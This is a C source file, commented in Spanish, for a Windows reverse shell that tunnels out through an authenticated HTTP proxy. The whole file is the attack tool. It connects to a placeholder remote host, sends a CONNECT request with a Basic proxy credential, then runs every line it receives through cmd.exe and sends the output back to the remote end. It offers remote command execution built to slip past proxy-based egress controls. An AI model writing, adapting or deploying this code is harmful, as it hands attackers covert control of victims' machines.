
/**************************************************
 * shell reversa para windows con proxy 
 * (mingw): gcc -Wall -O2 rcmd.c -o rcmd -lwsock32
 **************************************************/
 
#include <windows.h>
#include <winsock.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <errno.h>

// configuracion
#define RHOST "X.X.X.X" 
#define RPORT 8080
#define HOST "X.X.X.X"
#define PORT 8443
#define AUTH "TVlET01cdXNyMToxMjM0"

// macros ayuda
#define X_ABORT(x) do { perror(x); exit(-1); } while(0);
#define TRY(x, msg) if (x == -1) X_ABORT(msg); 
#define SZ_SBUF 256
#define OUT_FILE "c:\\tmp\\rcmd.txt"

// variables globales
int f, s; 

// do_exit 
void do_exit()
{
	// borramos temp
	unlink(OUT_FILE);
	
	// cerramos socket
	closesocket(s);
	WSACleanup();
	
	// salimos
	exit(0);
}

// funcion principal
void main()
{
	struct sockaddr_in sa;
	int sz, r;
	struct hostent *host;
	WSADATA wsaData;
	char sbuf[SZ_SBUF];
	char cmd[SZ_SBUF + 50]; 

	// control interrupciones 
	signal(SIGINT, do_exit);
	signal(SIGTERM, do_exit);

	// init winsock
	if (WSAStartup(MAKEWORD(1, 1), &wsaData)) 
	{
		fprintf(stderr, "WSAStartup error");
		exit(-1);
	}
	
	// creamos socket
	TRY((s = socket(AF_INET, SOCK_STREAM, 0)), "socket")
	
	// resolucion nombres
	if (! (host = gethostbyname(RHOST)))
	{
		fprintf(stderr, "host not found ");
		exit(-1);
	}

	// estructura server_addr
	sa.sin_family = AF_INET;
	sa.sin_port = htons(RPORT);
	sa.sin_addr =  *(struct in_addr *)host->h_addr;

	// intentamos conectar
	TRY(connect(s, (struct sockaddr *)&sa, sizeof(sa)), "connect");

/* proxy */

	// conectamos via proxy 
	sprintf(sbuf, "CONNECT %s:%d HTTP/1.1", HOST, PORT);
	sprintf(sbuf, "%s\nHost: %s %d", sbuf, HOST, PORT);
	sprintf(sbuf, "%s\nProxy-Authorization: Basic %s", sbuf, AUTH);
	sprintf(sbuf, "%s\n\n", sbuf);
	
	// enviamos cadena conexion 
	TRY(send(s, sbuf, strlen(sbuf), 0), "send");
		
	// respuesta ?
	TRY((sz = recv(s, sbuf, SZ_SBUF, 0)), "recv");
			
	// HTTP/1.1 200 Connection established
	if (! sscanf(sbuf, "HTTP/1.1 %d", &r) || r != 200)
	{
		fprintf(stderr, "%s", sbuf);
		exit(-1);
	}
		
/* proxy */	
			
	// while true...
	do
	{
		// enviamos prompt 
		TRY(send(s, "C:\\> ", 5, 0), "send");
		
		// recibimos texto 
		TRY((sz = recv(s, sbuf, SZ_SBUF, 0)), "recv");
		
		// construimos comando
		sbuf[sz ? sz - 1 : 0] = 0;	
		sprintf(cmd, "cmd.exe /c %s > %s 2>&1", 
			sbuf, OUT_FILE);
		
		// ejecutamos 
		if (system(cmd) != -1)
		{
			// abrimos fichero resultados
			TRY((f = open(OUT_FILE, 0)), "open");
			
			// leemos y enviamos...
			while ((sz = read(f, sbuf, SZ_SBUF)) > 0)
				TRY(send(s, sbuf, sz, 0), "send");

				// cerramos fichero temporal
			close(f); 
		}
	}
	while (1);

	// salimos
	do_exit();
}
